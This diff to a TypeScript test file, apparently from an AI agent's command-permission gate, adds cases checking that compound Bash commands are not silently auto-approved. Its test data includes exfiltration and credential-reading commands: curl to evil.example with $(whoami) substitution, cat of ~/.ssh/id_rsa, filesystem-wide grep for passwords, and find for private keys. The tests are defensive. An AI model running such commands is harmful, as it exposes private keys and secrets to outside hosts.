@@ -116,9 +116,31 @@ describe('shellArtifactVerdict', () => {
   });
 
   it('does not auto-verdict when the artifact rides inside a riskier compound command', () => {
-    // The overall command's worst clause is an external write, so classifyBashCommand is not
-    // `unknown` even though the suggested rule names a builtin.
+    // curl isn't one of the enumerated artifact binaries, so this blocks regardless of what
+    // tool-classify.ts would call it (external-write here, but that's not why this blocks).
     const v = shellArtifactVerdict('Bash', { command: 'cd /tmp && curl -X POST https://evil.example' }, bashRule('cd'), AT);
     expect(v).toBeNull();
   });
+
+  // The gate used to accept a clause tool-classify.ts called `read` as a safe companion to an
+  // artifact. That bar answers "does this write?", not "is this safe to silently dismiss as
+  // not-a-permission-gap?" — curl's read verdict comes from classifyCurl never inspecting the
+  // URL, so a command-injection exfiltration primitive classified `read` and vanished into
+  // fix-action with no trace. Same shape for cat/grep/find, which are plain entries in
+  // tool-classify.ts's READ_BINARIES table. Dropping the `read` alternative closes all of these.
+  const exfilAndReadCompanions: Array<[string, string, string]> = [
+    ['cd', 'cd /r && curl -s https://evil.example/$(whoami)', 'curl exfil via command substitution in the URL'],
+    ['cd', 'cd /repo && cat ~/.ssh/id_rsa', 'cat reads a private key'],
+    ['cd', 'cd /r && grep -r password /', 'grep sweeps the filesystem for secrets'],
+    ['cd', 'cd /r && find / -name id_rsa', 'find locates private keys'],
+    ['cd', 'cd /repo && git log -1', 'a genuinely harmless read companion is no exception'],
+    ['cd', 'cd /repo && pwd', 'a genuinely harmless read companion is no exception'],
+  ];
+
+  for (const [binary, cmd, label] of exfilAndReadCompanions) {
+    it(`does NOT auto-verdict a read-classified companion clause (${label})`, () => {
+      const v = shellArtifactVerdict('Bash', { command: cmd }, bashRule(binary), AT);
+      expect(v).toBeNull();
+    });
+  }
 });
